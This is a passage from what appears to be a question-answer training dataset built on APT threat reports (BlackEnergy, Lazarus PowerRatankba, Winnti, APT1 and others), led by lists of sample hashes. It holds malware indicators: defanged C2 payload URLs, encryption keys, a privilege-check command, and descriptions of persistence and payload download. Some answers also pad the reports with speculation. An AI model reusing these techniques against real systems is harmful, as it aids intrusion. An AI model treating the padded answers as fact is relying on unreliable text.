c1e7368eda5aa7b09e6812569ebd4242 ec99e82ad8dbf1532b0a5b32c592efdf 391b9434379308e242749761f9edda8e 6bf76626037d187f47a54e97c173bc66 895f7469e50e9bb83cbb36614782a33e 1feacbef9d6e9f763590370c53cd6a30 82234c358d921a97d3d3a9e27e1c9825 558d0a7232c75e29eaa4c1df8a55f56b\ne565255a113b1af8df5adec568a161f3 1821351d67a3dce1045be09e88461fe9 b1fe41542ff2fcb3aa05ff3c3c6d7d13 53c5520febbe89c25977d9f45137a114 4513e3e8b5506df268881b132ffdcde1 19ce80e963a5bcb4057ef4f1dd1d4a89 9b29903a67dfd6fec33f50e34874b68b b637f8b5f39170e7e5ada940141ddb58 c09683d23d8a900a848c04bab66310f1 6d4c2cd95a2b27777539beee307625a2 e32d5c22e90cf96296870798f9ef3d15 64c3ecfd104c0d5b478244fe670809cc b69f09eee3da15e1f8d8e8f76d3a892a 294f9e8686a6ab92fb654060c4412edf 6135bd02103fd3bab05c2d2edf87e80a b973daa1510b6d8e4adea3fb7af05870 8dce09a2b2b25fcf2400cffb044e56b8 6008f85d63f690bb1bfc678e4dc05f97 1bf8434e6f6e201f10849f1a4a9a12a4 6cac1a8ba79f327d0ad3f4cc5a839aa1 462860910526904ef8334ee17acbbbe5 eeec7c4a99fdfb0ef99be9007f069ba8 6bbc54fb91a1d1df51d2af379c3b1102 8b152fc5885cb4629f802543993f32a1 6d1187f554040a072982ab4e6b329d14 3bfe642e752263a1e2fe22cbb243de57 c629933d129c5290403e9fce8d713797 1c62b3d0eb64b1511e0151aa6edce484 811fcbadd31bccf4268653f9668c1540 0a89949a3a933f944d0ce4c0a0c57735 a0f594802fbeb5851ba40095f7d3dbd1 bf6ce6d90535022fb6c95ac9dafcb5a5 df84ff928709401c8ad44f322ec91392 fda6f18cf72e479570e8205b0103a0d3 39835e790f8d9421d0a6279398bb76dc fe6295c647e40f8481a16a14c1dfb222\n592c5fbf99565374e9c20cade9ac38aa ad8dc222a258d11de8798702e52366aa bc21639bf4d12e9b01c0d762a3ffb15e 3122353bdd756626f2dc95ed3254f8bf e02d19f07f61d73fb6dd5f7d06e9f8d2 d2c7bf274edb2045bc5662e559a33942 ac1a265be63be7122b94c63aabcc9a66 e06c27e3a436537a9028fdafc426f58e 6cf2302e129911079a316cf73a4d010f 38b6ad30940ddfe684dad7a10aea1d82 f190cda937984779b87169f35e459c3a 698a41c92226f8e444f9ca7647c8068c bc95b3d795a0c28ea4f57eafcab8b5bb 82127dc2513694a151cbe1a296258850 d387a5e232ed08966381eb2515caa8e1 f4b9eb3ddcab6fd5d88d188bc682d21d 8e42fd3f9d5aac43d69ca740feb38f97 a43e8ddecfa8f3c603162a30406d5365 ea7dd992062d2f22166c1fca1a4981a1 7bf6dcf413fe71af2d102934686a816b cf064356b31f765e87c6109a63bdbf43 4a46e2dc16ceaba768b5ad3cdcb7e097 2134721de03a70c13f2b10cfe6018f36 7add5fd0d84713f609679840460c0464 cc9402e5ddc34b5f5302179c48429a56 9803e49d9e1c121346d5b22f3945bda8 c5f5837bdf486e5cc2621cc985e65019 2b72fda4b499903253281ebbca961775 7031f6097df04f003457c9c7ecbcda1c 6a6c2691fef091c1fc2e1c25d7c3c44c 9bd3fa59f30df5d54a2df385eba710a5 5100eb13cac2fc3dec2d00c5d1d3921c 0a2c2f5cf97c65f6473bdfc90113d81e 30b74abc22a5b75d356e3a57e2c84180 a0424e8436cbc44107119f62c8e7491b c1ba892d254edd8a580a16aea6f197e9\ne70976785efcfaeed20aefab5c2eda60 397b5d66bac2eb5e950d2a4f9a5e5f2c 4e9bde9b6abf7992f92598be4b6d1781 54d266dee2139dd82b826a9988f35426 5b4faa2846e91e811829a594fecfe493 907448af4388072cdc01e69b7b97b174 ccad214045af69d06768499a0bd3d556 1395dfda817818c450327ab331d51c1b 715e9e60be5a9b32075189cb04a0247e 3835c8168d66104eed16c2cd99952045 f32c29a620d72ec0a435982d7a69f683 95e9162456d933fff9560bee3c270c4e da01ef50673f419cf06b106546d06b50 2dd4c551eacce0aaffedf4e00e0d03de 34f80f228f8509a67970f6062075e211 81ca7526881a0a41b6721048d2f20874 d642c73d0577dd087a02069d46f68dac\nBE3 MD5s:\nf0ebb6105c0981fdd15888122355398c 7cb6363699c5fd683187e24b35dd303e 4d5c00bddc8ea6bfa9604b078d686d45 f37b67705d238a7c2dfcdd7ae3c6dfaa 46649163c659cba8a7d0d4075329efa3 628ef31852e91895d601290ce44650b1 723eb7a18f4699c892bc21bba27a6a1a 8b9f4eade3a0a650af628b1b26205ba3 f6c47fcc66ed7c3022605748cb5d66c6 6c1996c00448ec3a809b86357355d8f9 faab06832712f6d877baacfe1f96fe15 2c72ef155c77b306184fa940a2de3844 2e62e8949d123722ec9998d245bc1966 b0dc4c3402e7999d733fa2b668371ade 93fa40bd637868a271002a17e6dbd93b f98abf80598fd89dada12c6db48e3051 8a7c30a7a105bd62ee71214d268865e3\n2f6582797bbc34e4df47ac25e363571d 81d127dd7957e172feb88843fe2f8dc1 3e25544414030c961c196cea36ed899d\nQuestion: In the context of the BlackEnergy2 (BE2) malware, what is the significance of the 'build_id' field found in the config files? How does this field help in identifying the malware version and potential targets?",
    "output": "Answer: The 'build_id' field in the config files of BE2 main.dll is crucial for identifying the malware version for the operators. This field typically contains a pattern consisting of three hex numbers and three letters, such as '0C0703hji'. The numbers indicate the date of file creation in the format: Year-Month-Day. The purpose of the letters is unknown but is speculated to indicate the targets. Sometimes, decimal numbers are used instead of hex numbers, for example, '100914_mg' and '100929nrT'. The earliest build id found, 'OB020Ad0V', suggests that the BE2/SandWorm APT started operating as early as the beginning of 2010.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the use of a hired actor in Operation Manul align with the observed characteristics of the Command and Control (C&C) servers? Explain the implications of this alignment on the nature of the campaign.",
    "output": "The use of a hired actor in Operation Manul aligns with the observed characteristics of the C&C servers, which included web-based control panels for multiple Remote Access Trojans (RATs), suggesting that several campaigns were being run simultaneously. This alignment implies that the campaign was likely outsourced to a third-party actor, such as Appin Security Group, an Indian security company. The presence of multiple RAT control panels indicates a level of sophistication and organization that is consistent with a professional cybersecurity firm conducting multiple operations concurrently. This also explains the generic and uninspired nature of the phishing attempts, which often took the form of emails purporting to contain invoices or legal documents with attachments containing blurry images.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Pallas malware handle exfiltrated data from compromised Android devices? Describe the structure and processing of the exfiltrated data.",
    "output": "Pallas handles exfiltrated data server-side via the upload.php script, which accepts HTTP POST requests with specific headers and structures. When Pallas receives the GALL1 instruction, it uploads exfiltrated data as a zip archive or saves it as a .db file. For most .db files, each line is base64 encoded and prepended with the string '*#@'. When decoded, each line translates to a piece of exfiltrated data associated with a content keyword or data type. The structure of the exfiltrated data can be represented as '<DataType><separator>[<field><separator>...<field><separator>]'. Analysis of known Pallas samples has identified 10 different data types, including contact information, call logs, text messages, and Wi-Fi scan results.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nFor at least several years, a mysterious threat actor infiltrated and tracked, performed surveillance and stole data from governmental organisations, some private companies and human rights activists throughout the Commonwealth of Independent States (CIS) and Eastern European nations. Some parts of this operation extended into Western nations and the Middle East as well, with victims in sectors such as energy and heavy industry manufacturing. The attackers performed their intelligence gathering and surveillance partly using TeamViewer (), a legitimate support software package commonly used for remote administration. In addition, they deployed custom written intelligence gathering components and lateral movement utilities.\nWe are calling this threat actor the \"TeamSpy crew\" because of their preference for using the legal software TeamViewer as a main part of their toolset.\n\nQ: Why did the TeamSpy crew choose to use TeamViewer as a primary tool in their operations, and how did this choice contribute to their ability to conduct surveillance and data theft?",
    "output": "A: The TeamSpy crew chose to use TeamViewer, a legitimate remote administration software, as a primary tool in their operations for several reasons. Firstly, TeamViewer is widely used and recognized, which makes its presence on a system less suspicious compared to unknown or malicious software. This allowed the attackers to blend in and avoid detection by traditional security measures. Secondly, TeamViewer provides robust remote access capabilities, enabling the attackers to perform surveillance and gather intelligence effectively. By leveraging a legitimate tool, the TeamSpy crew could conduct their activities while minimizing the risk of being identified and blocked by security systems. Additionally, the use of TeamViewer facilitated lateral movement within compromised networks, allowing the attackers to spread their influence and access more sensitive data across different systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the purpose of the global event named 'Global\\\\5164FDA21542C0EB638BA110F9F3ADAF' during the installation phase of the Winnti malware? How does this event contribute to the installation process?",
    "output": "The global event named 'Global\\\\5164FDA21542C0EB638BA110F9F3ADAF' serves as a poor man's mutex during the installation phase of the Winnti malware. Its purpose is to indicate that the installation process is currently ongoing. This event gives other processes time to read the event check by introducing a 12-second delay before continuing the installation process. This mechanism helps coordinate the installation activities and ensures that other components of the malware are aware of the ongoing installation, preventing potential conflicts or duplicated efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: THE 'OSCAR' PROTOCOL\nNumerous computers were observed\t communicating with an 'alyac.org' subdomain on TCP\t port\t 80\t via the 'Oscar' protocol. Most, but\t not all,\t of the computers also\t communicated to the same domain via the 'Update?' communications.\t The protocol is\t believed to\t be associated\t with the same malware that produces the 'Update?' communications \u2013 the Destory RAT.\nEach\t compromised computer communicated at\t a different interval to the others, and\t accordingly,\t the malware on each of\t the compromised\t computers appears to have been individually\t configured.\t For example,\t one computer communicated every 12 seconds\tand\t another every\t16 seconds.\nEncrypted data was sent during each\t communication. The length of\t the encrypted data in each\t packet\t varied between 16 bytes and 89 bytes.\t After sending\t the encrypted data the malware waited for a response.\nMedium Headline: TABLE 5: 'BB' PROTOCOL PACKET FORMAT\nOnce decoded,\t the data reveals a basic beacon containing the computer name and IP address of\t the infected computer.\nAfter sending\t the basic beacon,\t the compromised computers waited for a response from the server,\t then closed the connection when they had\t not received a response from the server within five seconds.\nBoth\tof the compromised\t computers reattempted the communications approximately\t every\t eight seconds. On some days the high frequency\t of\t the beacon activity resulted in over 10000 connection attempts per victim in a 24 hour period.\nBig Headline: THE 'DB' PROTOCOL\nA single computer was observed\t communicating\t with the domain 'update.alyac.org' via the 'DB' protocol.\t The communications originated from the same Chinese computer network as one of\t the 'BB' victims but\t from a different\t computer on that\t network.\t It is not known what\t malware generates the 'DB' communications,\t or whether it is the same malware that generates the 'BB' communications.\nThe communications reveal detailed\t OS and system\t information about\t the compromised computer as shown in Table 6.\t The OS information reveals that\t the compromised\t computer is running Windows 2003 Server Service Pack 2. The detailed system\t information reveals that\t the compromised computer has an Intel Pentium\t Pro\u00adclass processor, four logical processors and\t an LGA 77542 Central Processing\t Unit (CPU) socket.\nMedium Headline: TABLE 6: SUMMARY OF FIRST 202 BYTES OF A 'DB' PACKET\nThe DB communications typically\t occurred at intervals of\t between 4\t and 92\t seconds, however, sometimes they were much further apart. After sending\t the detailed beacon to\t the command\t and control server,\t the compromised computer appeared to\t expect a response from the server.\n42 The combined processor level and processor revision information indicates the computer has an LGA 775\t CPU socket (Intel family 6/ model\t 15/ stepping\t 11). (Microsoft Corporation, 2011) (Wikipedia)\n43 On several occasions the 4 bytes\t '70 17 00 00'\t were prepended to the communications.\n\nWhat insights can be gained from analyzing the 'DB' protocol communications observed during the SK Communications hack? How might this information be useful for cybersecurity experts in mitigating future threats?",
    "output": "The 'DB' protocol communications observed during the SK Communications hack provide detailed OS and system information about the compromised computer. Specifically, the communications reveal that the compromised computer is running Windows 2003 Server Service Pack 2 and has an Intel Pentium Pro-class processor with four logical processors and an LGA 775 CPU socket. This detailed information is valuable for cybersecurity experts because it helps them understand the specific vulnerabilities and configurations that the attackers are targeting. By knowing the exact operating system and hardware specifications, security teams can better tailor their defenses and patch management strategies to protect against similar attacks. Additionally, recognizing the unique patterns and content of 'DB' protocol communications can aid in developing more effective detection mechanisms and incident response plans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: PowerRatankba Persistence\nFor persistence, PowerRatankba.A saves a JS file to the victim's Startup folder as appView.js that will be executed every time the victim's user account logs in. The persistence JS (Fig. 34) contains a XOR encoded PowerShell script to retrieve a Base64 encoded PowerShell from a hardcoded URL (e.g., hxxp://macintosh.linkpc[.]net:8080/mainls.cs ). The encoded PowerShell script used a XOR key of \"ZWZBGMINRQLUSVTGHWVYANJHTVUHTLTUGKOHIYOXQEFEIPHNGACNKMBWGRTJIHRANIIZJNNZHVF\".\nPowerRatankba.B is capable of using two different persistence methods while only one will be used based on whether or not the executing user has Administrator privileges. PowerRatankba first checks if the account has administrator privileges by executing the following command: \"whoami /groups | findstr /c:\"S-1-5-32-544\" | findstr /c:\"Enabled group\" && goto:isadministrator''. If the user account does have administrator privileges then PowerRatankba will download a PowerShell script from a hardcoded location (e.g., \"$BaseServer + 'images/character.gif'\"), save it to a hardcoded location (e.g., C:/Windows/System32/WindowsPowerShell/v1.0/Examples/detail.ps1), and finally create a scheduled task to execute the downloaded PowerShell script on system startup. If the user account does not have administrator privileges then a VBScript file is downloaded from a hardcoded location (e.g., \"$BaseServer + 'images/top_bar.gif'\") and saved to the executing user's Startup folder as, for example, PwdOpt.vbs or ProxyServer.vbs.\nMedium Headline: PowerRatankba.B Stage2 - Gh0st RAT\nA (<http://download01.norman.no/documents/ThemanyfacesofGh0stRat.pdf>)Gh0st remote access Trojan/tool (RAT) was delivered via PowerRatankba.B to several devices running common cryptocurrency-related applications. The Gh0st RAT samples were delivered via the memory injection exe/inj command (Fig. 35). After decrypting the command with DES the target URL was revealed to be hxxp://180.235.133[.]235/img.gif (Fig. 36).\nFigure 35: Exe command delivered from PowerRatankba.B C&C to infected device\nThe fake image was actually a Base64-encoded custom encryptor with the embedded, encrypted Gh0st RAT as the final payload. The encryptor utilized AES in CBC-mode with the (<http://cryptome.info/0001/bcm/sp800-38a.htm>)NIST (<http://cryptome.info/0001/bcm/sp800-38a.htm>)Special Publication 800-38A example key of \"2B7E151628AED2A6ABF7158809CF4F3C\" and IV of \"000102030405060708090A0B0C0D0E0F\" (Fig. 37).\nThe decrypted Gh0st implant is a custom variant with magic bytes of RFC18 (Fig. 38). This variant was likely based on version 3.4.0.0 of Gh0st/PCRat, however we consider it likely that the author(s) have given their implants an internal version of 1.0.0.1 as can be observed in the decompressed initial check-in to the C&C (as well as hardcoded in the binaries) (Fig. 39).\nMuch of the 3.4.0.0 code remains the same, including the usage of Zlib compression and the infamous \\x78\\x9c default Zlib compression header bytes (Fig. 40) observed in countless Gh0st RAT samples (<http://download01.norman.no/documents/ThemanyfacesofGh0stRat.pdf>)over the years.\nMedium Headline: Gh0st RAT Purpose\nDuring our research we discovered that long-term sandboxing detonations of PowerRatankba not running cryptocurrency-related applications were never infected with a Stage2 implant. This may indicate that the PowerRatankba operator(s) were only interested in infecting device owners with an obvious interest in various cryptocurrencies. In one case, a RFC18 Gh0st RAT was delivered to a PowerRatankba.B infected device within twenty minutes of the initial infection. From analyzing C&C traffic logs we assess that a Lazarus operator almost immediately viewed the screen of the infected device and then proceeded to take over full remote control, giving them the ability to interact with applications on the infected device, including a password-protected Bitcoin wallet application.\nMedium Headline: Shopping Spree: Enter RatankbaPOS\nBeyond (<http://www.bbc.com/news/world-asia-42378638>)stealing millions of US dollars worth of cryptocurrency, we have discovered a Lazarus operation to steal point-of-sale (POS) data primarily targeting POS terminals of businesses operating in South Korea. Considering the time of year, most retail businesses around the world report their highest volume of sales between November and December so naturally POS is a popular target for criminals. Enter RatankbaPOS, possibly the first publicly documented nation-state sponsored campaign to steal POS data from a POS-related framework.1\nAt this time we have been unable to determine how RatankbaPOS is being delivered; however, based on its sharing of C&C with PowerRatankba implants we hypothesize that Lazarus operators infiltrated at least one organization's networks utilizing PowerRatankba to deploy later stage implants (including the possibility of RFC18 Gh0ST RAT) to ultimately deploy RatankbaPOS. Based on the fact that the file was hosted on the C&C in plaintext, and not Base64 encoded, we assess that RatankbaPOS was more likely deployed with a later stage implant other than PowerRatankba.\nQuestion: What are the two different persistence methods used by PowerRatankba.B depending on user privileges, and how are they implemented?",
    "output": "Answer: PowerRatankba.B uses two different persistence methods based on whether the executing user has Administrator privileges. If the user account has administrator privileges, PowerRatankba downloads a PowerShell script from a hardcoded location, saves it to a specific directory, and creates a scheduled task to execute the script on system startup. If the user account does not have administrator privileges, a VBScript file is downloaded from a hardcoded location and saved to the executing user's Startup folder as PwdOpt.vbs or ProxyServer.vbs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: APT1 Hacker Profile: SuperHard (Mei Qiang/\u6885\u5f3a)\nThe third and final persona we are revealing has been dubbed \"SuperHard\" (SH). SH was first observed as a tool author, and is either the creator or a significant contributor to the AURIGA and BANGAT malware families (covered in Appendix C: The Malware Arsenal). Similarly to UG, SH signs much of his work by embedding strings within the tools. In particular, elements of the portable executable (PE) file's VS_VERSIONINFO structure are frequently set to \"SuperHard,\" or cmd.exe copies are modified from \"Microsoft corp.\" to \"superhard corp.\"\nAdditionally, many of SH's tools contain driver modules designed to be loaded into the Windows kernel in order to subvert elements of the system. While not unique for APT1 coders, this level of development expertise is certainly a discriminator that puts SH into a smaller group of highly capable developers within APT1. Often, SH's tools are observed in use by other APT1 personae and in several instances, other APT groups we track. Given that SH's tools are used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is primarily involved in research and development for APT1.\nOnce again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit. com account \"SuperHard_M\" was originally registered from the IP address 58.247.237.4, within one of the known APT1 egress ranges, and using the email address \"mei_qiang_82@sohu.com\". We have observed the DOTA persona emailing someone with the username mei_qiang_82. The name \"Mei Qiang\" (\u6885\u5f3a) is a reasonably common Chinese last/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several \"Mei Qiang\" identities online that claim a birth year of 1982, making attribution to an individual difficult.\nFortunately, we can use SH's email address to connect him to a number of Websites and forums on which he registered and contributed using that address. Many of these accounts reveal details that reinforce SH's link to the \"mei_qiang_82@sohu.com\"43 email address and APT1 affiliation, such as SH offering to write Trojans for money, his involvement with malicious Windows kernel research (incidentally, also commented on by \"greenfield\", possibly UG), and more recently, being local to Shanghai's Pudong New Area.44\n42 Mark A. Stokes, Jenny Lin, and L.C. Russell Hsiao, \"The Chinese People's Liberation Army Signals Intelligence and Cyber Reconnaissance Infrastructure,\" Project 2049 Institute (2011): 6-7, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, accessed February 6, 2013.\n43 Sohu.com is a popular Chinese search engine, webmail, and Internet advertising company based out of Beijing China.\n44 hxxp://tuziw.com/index.php?m=ta&id=1864863532\nBig Headline: ConCLusIon\nIn a State that rigorously monitors Internet use, it is highly unlikely that the Chinese Government is unaware of an attack group that operates from the Pudong New Area of Shanghai. The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. (<>)Table 12 summarizes the parallels between APT1 and PLA Unit 61398.\ntaBLe 12: Matching characteristics between aPt1 and unit 61398\nCombining our direct observations with carefully researched and correlated findings; we believe the facts dictate only two possibilities:\neither\nA secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398's gates, performing tasks similar to Unit 61398's known mission.\nor\nAPT1 is Unit 61398.\nBig Headline: aPPenDIx a: how Does ManDIant DIstInGuIsh threat GrouPs?\nMandiant uses the term threat group to refer to a collection of intruders who are working together to target and penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is ultimately defined by people and not by methodology.\nHowever, defining a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the same person, by two people who are working together, by two unrelated people who independently compromised the same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, particularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT. Furthermore, there may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise the same target.\nNevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details:\n\u00bb\u00bb The method the thief used to break in;\n\u00bb\u00bb The tools used to open the safe;\n\u00bb\u00bb Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to grab something of value;\n\u00bb\u00bb Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as fingerprints; or whether he was not very careful, but simply relied on being \"stealthy enough\" to not get caught.\nForensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime scene was the result of one thief and not another.\nIn a similar way, cyber intruders leave behind various digital \"fingerprints.\" They may send spear-phishing emails from a specific IP address or email address. Their emails may contain certain patterns of subject lines. Their files have specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another.\nDigital \"fingerprints\" do not all carry equal weight in attribution analysis. Their validity or value as indicators of a specific threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as HTRAN is not unique and not useful \u2014 by itself \u2014 as an indicator of a specific threat group. In contrast, the use of a specific, custom backdoor not observed elsewhere is a much stronger indicator \u2014 although it is generally still not sufficient, on its own, for positive attribution.\nAt the most basic level, we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same person or group of people were involved.\nMedium Headline: aPPenDIx B: aPt anD the attaCk LIFeCyCLe\nWhile most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese APT lifecycle differs slightly because of their unique long-term objectives. The sections below correspond to the stages of Mandiant's Attack Lifecycle model and give an overview of what APT activity looks like in each stage. The stages between \"Establish Foothold\" and \"Complete Mission\" do not have to occur in this order every time. In fact, once established within a network, APT groups will continually repeat the cycle of conducting reconnaissance, identifying data of interest, moving laterally to access that data, and \"completing mission\" by stealing the data. This will generally continue indefinitely until they are removed entirely from the network.\nSmall Headline: Initial Compromise\nThe Initial Compromise stage represents the methods that intruders use to penetrate a target organization's network. APT intruders frequently target individual users within a victim environment. As such, the most commonly observed method of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to a malicious file, or a link to a malicious website. Less commonly, APT intruders may attempt to contact potential victims and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer is vulnerable to the attacker's exploit code. APT groups may also look for vulnerable Internet-facing web servers and upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in public-facing infrastructure.\n\nQuestion: How does the persona 'SuperHard' (SH) contribute to APT1's operations, and what distinguishes his development expertise within the group?\n\nAnswer:",
    "output": "SuperHard (SH) is primarily involved in research and development for APT1. He is either the creator or a significant contributor to the AURIGA and BANGAT malware families. SH's tools often contain driver modules designed to be loaded into the Windows kernel to subvert elements of the system, demonstrating a high level of development expertise. This expertise sets SH apart as one of the more capable developers within APT1. His tools are frequently used by other APT1 personae and sometimes by other APT groups, indicating his role as a tool author rather than a full-time operator.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Russian Hacker Forums Fueled Georgia Cyber Attacks\nAn exhaustive inquiry into August's cyber attacks on the former Soviet bloc nation of Georgia finds no smoking gun in the hands of the Russian government. But experts say evidence suggests that Russian officials did little to discourage the online assault, which was coordinated through a Russian online forum that appeared to have been prepped with target lists and details about Georgian Web site vulnerabilities well before the two countries engaged in a brief but deadly ground, sea and air war.\nThe findings come from an open source investigation launched byProject Grey Goose, a volunteer effort by more than 100 security experts from tech giants like Microsoft and Oracle, as well as former members of the Defense Intelligence Agency, Lexis-Nexis, theDepartment of Homeland Security and defense contractor SAIC, among others.\nThe group began its inquiry shortly after the cyber war disabled a large number of Georgia government Web sites. Starting with the Russian hacker forum Xaker.ru (hacker.ru), investigators found a posting encouraging would-be cyber militia members to enlist at a private, password-protected online forum called StopGeorgia.ru. Grey Goose principal investigator Jeff Carr said the administrators of the hacker forum were keenly aware that American cyber sleuths were poking around: Within hours after discovering the link to the StopGeorgia site, Xaker.ru administrators deleted the link and banned all access from U.S.-based Internet addresses.\nAt StopGeorgia.ru, project members unearthed a top-down hierarchy of expert hackers who doled out target lists of Georgian government Web sites to relative novices, complete with instructions on how to exploit vulnerabilities in the sites in order to render them inaccessible. Following a July defacement of the Georgian president's Web site that was blamed on Russian hackers, the Georgian government blocked Russian Internet users from visiting government Web sites.\nBut Carr said StopGeorgia administrators also equipped recruits with directions on evading those digital roadblocks, by routing their attacks through Internet addresses in other Eastern European nations. The level of advance preparation and reconnaissance strongly suggests that Russian hackers were primed for the assault by officials within the Russian government and or military, Carr said.\n\"The fact that the StopGeorgia.ru site was up and running within hours of the ground assault -- with full target lists already vetted and with a large member population -- was evidence that this effort did not just spring up out of nowhere,\" said Carr, speaking at a forum in Tysons Corner, Va., sponsored by Palantir Technologies, an In-Q-Tel funded company in Palo Alto, Calif., whose data analysis software helped Grey Goose investigators track the origins and foot soldiers involved in the cyber attack. \"If they were planning ahead of the invasion, how did they know the invasion was going to occur? The only way they could have known that is if they were told.\"\nInitially, security experts assumed that the sites were felled via \"distributed denial of service\" (DDoS) attacks, a well-known method of assault that uses hundreds or thousands of compromised personal computers to flood a targeted site with so much junk traffic that it can no longer accommodate legitimate visitors. But investigators soon learned that attackers were instructed in the ways of a far more simple but equally effective attack strategy capable of throttling a targeted Web site using a single computer.\nSecurity researcher and Grey Goose investigator Billy Rios said attackers disabled the sites using a built-in feature of MySQL, a software suite widely used by Web sites to manage back-end databases. The \"benchmark\" feature in MySQL allows site administrators to test the efficiency of database queries, but last year hackers posted online instructions for exploiting the benchmark feature to inject millions of junk queries into a targeted database, such that the Web servers behind the site become so tied up with bogus instructions that they effectively cease to function.\n\"Not only can a small number of users bring down the back end databases, it indicates that there was some form of planning, reconnaissance, and some technical sophistication by some of the members,\" Rios said. \"It also indicates that all the information from the attacked systems was most likely already compromised and pilfered before the injection point was posted.\"\nWhile Grey Goose members could find no direct link between Russian government officials and the StopGeorgia.ru forum administrators, they claim it is unreasonable to conclude that no such connection exists.\n\"The historical record shows clear support by members of the Russian government and implied consent in its refusal to intervene or stop the hacker attacks,\" the report states, naming at least three Russian politicians and military officials who have previously endorsed coordinated cyber attacks against other nations as a show of nationalistic pride.\nOleg Gordievsky, a former colonel in the Russian KGB who defected to the British intelligence wing MI6 in 1985, spoke in 1998 at an international conference on crime and discussed how Russian hackers convicted of cyber crime are sometimes offered an alternative to prison -- working for the FSB\" (the federal security service of the Russian Federation and a successor to the KGB).\nAccording to a cyber warfare analysis by researchers at Dartmouth College, Moscow has a track record of offensive hacking into Chechen Web sites. The researchers provide this account of incidents in 2002, when Russian hackers used cyber warfare in to supplement the ongoing military conflict with Chechnya.\n\"In 2002, Chechen rebels claimed that two of their Web sites, kavkaz.org and chechenpress.com, crashed under hack attacks by the Russian FSB security service. The website crashes were reportedly timed to occur concurrently or shortly after Russian Special Forces troops stormed the Moscow Theater in which the rebels had taken hostages. \"On October 26 ... our Web Site kavkaz.org was attacked by a group of hackers,\" said a spokesman for the Chechen rebel site run by Movladi Udugov. Following the attack on the site, which is based in the United States, Udugov said that he was \"amazed Russia's special services can operate so freely on U.S. territory.\" The attacks on one site, chechenpress.com, fell under the category of brute-force denial of service (DoS) attacks, while on the other site, kavkaz.org, the attacks appeared much more sophisticated.\nAccording to Chechen sources, the Web site was hijacked by hackers from the FSB. The FSB hackers reportedly accomplished this by changing the domain registration of the site and then eliminating the data for the site from the hosting server. Upon learning of these attacks, the rebels moved the information on the sites to kavkazcenter.com. However, that site was attacked just a week later, also apparently the work of FSB hackers.\nIn July, Russian hackers were blamed for a similar assault on Lithuanian government Web sites. In Security Fix's account of that attack, I posted a copy of a congratulatory letter sent to nationalist Russian hackers by Nikolai Kuryanovich, a former member of the Russian Duma. The missive is dated March 2006, and addresses the hacker group Slavic Union after the group had just completed a series of successful attacks against Israeli Web sites.\n\"In the very near future many conflicts will not take place on the open field of battle, but rather in spaces on the Internet, fought with the aid of information soldiers, that is hackers,\" Kuryanovich wrote. \"This means that a small force of\nhackers is stronger than the multi-thousand force of the current armed forces.\"\nThe Grey Goose report concludes that the journeyman-apprentice relationship observed in the StopGeorgia forum will continue to be the training model used by nationalistic Russian hackers, and that those hackers are actively engaged in finding more efficient ways to disable networks.\nIn the meantime, Carr said, the Russian government will continue to deny any involvement in any nation-level cyber attacks.\n\"The Russian government has adopted this hands-off and satisfying position of deniability while enjoying the rewards achieved by the Russian hacker community,\" Carr said.\n\nWhat specific attack strategy was used to disable Georgian websites, and why was it considered effective despite being relatively simple?",
